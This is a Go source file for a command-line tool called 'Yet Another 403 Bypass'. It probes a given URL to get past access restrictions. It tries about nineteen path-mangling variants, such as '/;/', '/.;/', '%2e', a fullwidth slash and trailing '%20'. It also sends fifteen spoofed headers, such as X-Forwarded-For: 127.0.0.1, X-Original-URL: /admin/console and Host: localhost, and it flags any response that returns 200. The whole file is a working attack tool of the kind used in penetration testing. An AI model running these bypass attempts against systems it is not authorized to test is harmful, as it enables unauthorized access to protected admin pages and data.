package main

import (
	"fmt"
	"net/http"
	"os"
	"strings"
)

func PrintBanner() {
	banner := `
██    ██  █████  ██   ██  ██████  ██████  ██████  
 ██  ██  ██   ██ ██   ██ ██  ████      ██ ██   ██ 
  ████   ███████ ███████ ██ ██ ██  █████  ██████  
   ██    ██   ██      ██ ████  ██      ██ ██   ██ 
   ██    ██   ██      ██  ██████  ██████  ██████  
													 
                          Yet Another 403 Bypass													  
`
	fmt.Println(banner)
}

func GetPath(url string) string {
	return url[strings.LastIndex(url, "/")+1:]
}

func GetUrl(url string) string {
	return url[:strings.LastIndex(url, "/")]
}

func Check(err error) {
	if err != nil {
		panic(err)
	}
}

func Request(payload string) {

	colorReset := "\033[0m"

	colorRed := "\033[31m"
	colorGreen := "\033[32m"
	colorYellow := "\033[33m"

	response, err := http.Get(payload)
	Check(err)

	if response.StatusCode == 200 {
		fmt.Println(colorGreen + response.Status + colorReset + " => " + payload)
	} else if response.StatusCode == 401 || response.StatusCode == 403 || response.StatusCode == 404 {
		fmt.Println(colorRed + response.Status + colorReset + " => " + payload)
	} else {
		fmt.Println(colorYellow + response.Status + colorReset + " => " + payload)
	}

	defer response.Body.Close()
}

func RequestWithHeaders(url string, header string, value string) {

	colorReset := "\033[0m"

	colorRed := "\033[31m"
	colorGreen := "\033[32m"
	colorYellow := "\033[33m"

	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	Check(err)

	req.Header.Set(header, value)
	response, err := client.Do(req)
	Check(err)

	if response.StatusCode == 200 {
		fmt.Println(colorGreen + response.Status + colorReset + " => " + url + " (" + header + ": " + value + ")")
	} else if response.StatusCode == 401 || response.StatusCode == 403 || response.StatusCode == 404 {
		fmt.Println(colorRed + response.Status + colorReset + " => " + url + " (" + header + ": " + value + ")")
	} else {
		fmt.Println(colorYellow + response.Status + colorReset + " => " + url + " (" + header + ": " + value + ")")
	}

	defer response.Body.Close()
}

func main() {

	PrintBanner()

	if len(os.Args) < 2 {
		fmt.Println("Usage: 403-bypass <url>")
		fmt.Println("Example: 403-bypass \"http://example.com/secrets\"")
		return
	}

	base_url := os.Args[1]
	path := GetPath(base_url)
	url := GetUrl(base_url)

	if path == "" {
		fmt.Println("[-] Please enter a valid path.")
		fmt.Println("Example: http://example.com/secrets")
		return
	}

	Request(url + "/" + path)                  // site.com/secret
	Request(url + "/" + strings.ToUpper(path)) // site.com/SECRET
	Request(url + "/" + path + "/")            // site.com/secret/
	Request(url + "//" + path + "//")          // site.com//secret//
	Request(url + "/;/" + path)                // site.com/;/secret
	Request(url + "//;//" + path)              // site.com//;//secret
	Request(url + "/.;/" + path)               // site.com/.;/secret
	Request(url + "/%2e/" + path)              // site.com/%2e/secret
	Request(url + "/%252e/" + path)            // site.com/%252e/secret
	Request(url + "/%ef%bc%8f" + path)         // site.com/%ef%bc%8fsecret
	Request(url + "/" + path + "%20")          // site.com/secret%20
	Request(url + "/" + path + "%09")          // site.com/secret%09
	Request(url + "/" + path + ".json")        // site.com/secret.json
	Request(url + "/" + path + ".html")        // site.com/secret.html
	Request(url + "/" + path + ".php")         // site.com/secret.php
	Request(url + "/" + path + "/*")           // site.com/secret/*
	Request(url + "/" + path + "?")            // site.com/secret?
	Request(url + "/" + path + "/?blob")       // site.com/secret/?blob
	Request(url + "/" + path + "#")            // site.com/secret#

	RequestWithHeaders(base_url, "X-Originating-IP", "127.0.0.1")
	RequestWithHeaders(base_url, "X-Forwarded-For", "127.0.0.1")
	RequestWithHeaders(base_url, "X-Forwarded", "127.0.0.1")
	RequestWithHeaders(base_url, "Forwarded-For", "127.0.0.1")
	RequestWithHeaders(base_url, "X-Remote-IP", "127.0.0.1")
	RequestWithHeaders(base_url, "X-Remote-Addr", "127.0.0.1")
	RequestWithHeaders(base_url, "X-ProxyUser-Ip", "127.0.0.1")
	RequestWithHeaders(base_url, "X-Original-URL", "127.0.0.1")
	RequestWithHeaders(base_url, "Client-IP", "127.0.0.1")
	RequestWithHeaders(base_url, "True-Client-IP", "127.0.0.1")
	RequestWithHeaders(base_url, "Cluster-Client-IP", "127.0.0.1")
	RequestWithHeaders(base_url, "X-ProxyUser-Ip", "127.0.0.1")
	RequestWithHeaders(base_url, "Host", "localhost")
	RequestWithHeaders(base_url, "X-Original-URL", "/admin/console")
	RequestWithHeaders(base_url, "X-Rewrite-URL", "/admin/console")

}
